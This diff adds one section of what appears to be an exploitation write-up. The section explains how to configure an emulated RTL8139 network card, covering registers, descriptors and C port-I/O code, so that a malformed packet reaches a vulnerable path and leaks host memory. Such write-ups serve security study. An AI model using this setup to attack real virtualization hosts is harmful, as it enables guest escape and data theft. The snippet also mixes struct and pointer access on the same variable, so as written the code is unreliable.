@@ -1,0 +1,88 @@
+----[ 3.2 - Setting up the Card
+
+In order to send our malformed packet and read leaked data, we need to
+configure first Rx and Tx descriptors buffers on the card, and set up some
+flags so that our packet flows through the vulnerable code path.
+
+The figure below shows the RTL8139 registers. We will not detail all of
+them but only those which are relevant to our exploit:
+
+            +---------------------------+----------------------------+
+    0x00    |           MAC0            |            MAR0            |
+            +---------------------------+----------------------------+
+    0x10    |                       TxStatus0                        |
+            +--------------------------------------------------------+
+    0x20    |                        TxAddr0                         |
+            +-------------------+-------+----------------------------+
+    0x30    |        RxBuf      |ChipCmd|                            |
+            +-------------+------+------+----------------------------+
+    0x40    |   TxConfig  |  RxConfig   |            ...             |
+            +-------------+-------------+----------------------------+
+            |                                                        |
+            |             skipping irrelevant registers              |
+            |                                                        |
+            +---------------------------+--+------+------------------+
+    0xd0    |           ...             |  |TxPoll|      ...         |
+            +-------+------+------------+--+------+--+---------------+
+    0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |
+            +-------+------+------------+------------+---------------+
+
+- TxConfig: Enable/disable Tx flags such as TxLoopBack (enable loopback
+  test mode), TxCRC (do not append CRC to Tx Packets), etc.
+- RxConfig: Enable/disable Rx flags such as AcceptBroadcast (accept
+  broadcast packets), AcceptMulticast (accept multicast packets), etc.
+- CpCmd: C+ command register used to enable some functions such as
+  CplusRxEnd (enable receive), CplusTxEnd (enable transmit), etc.
+- TxAddr0: Physical memory address of Tx descriptors table.
+- RxRingAddrLO: Low 32-bits physical memory address of Rx descriptors
+  table.
+- RxRingAddrHI: High 32-bits physical memory address of Rx descriptors
+  table.
+- TxPoll: Tell the card to check Tx descriptors.
+
+A Rx/Tx-descriptor is defined by the following structure where buf_lo and
+buf_hi are low 32 bits and high 32 bits physical memory address of Tx/Rx
+buffers, respectively. These addresses point to buffers holding packets to
+be sent/received and must be aligned on page size boundary. The variable
+dw0 encodes the size of the buffer plus additional flags such as the
+ownership flag to denote if the buffer is owned by the card or the driver.
+
+struct rtl8139_desc {
+    uint32_t dw0;
+    uint32_t dw1;
+    uint32_t buf_lo;
+    uint32_t buf_hi;
+};
+
+The network card is configured through in*() out*() primitives (from
+sys/io.h). We need to have CAP_SYS_RAWIO privileges to do so. The following
+snippet of code configures the card and sets up a single Tx descriptor.
+
+#define RTL8139_PORT        0xc000
+#define RTL8139_BUFFER_SIZE 1500
+
+struct rtl8139_desc desc;
+void *rtl8139_tx_buffer;
+uint32_t phy_mem;
+
+rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);
+phy_mem = (uint32)gva_to_gpa(rtl8139_tx_buffer);
+
+memset(&desc, 0, sizeof(struct rtl8139_desc));
+
+desc->dw0 |= CP_TX_OWN | CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN |
+             CP_TX_IPCS | CP_TX_TCPCS;
+desc->dw0 += RTL8139_BUFFER_SIZE;
+
+desc.buf_lo = phy_mem;
+
+iopl(3);
+
+outl(TxLoopBack, RTL8139_PORT + TxConfig);
+outl(AcceptMyPhys, RTL8139_PORT + RxConfig);
+
+outw(CPlusRxEnb|CPlusTxEnb, RTL8139_PORT + CpCmd);
+outb(CmdRxEnb|CmdTxEnb, RTL8139_PORT + ChipCmd);
+
+outl(phy_mem, RTL8139_PORT + TxAddr0);
+outl(0x0, RTL8139_PORT + TxAddr0 + 0x4);
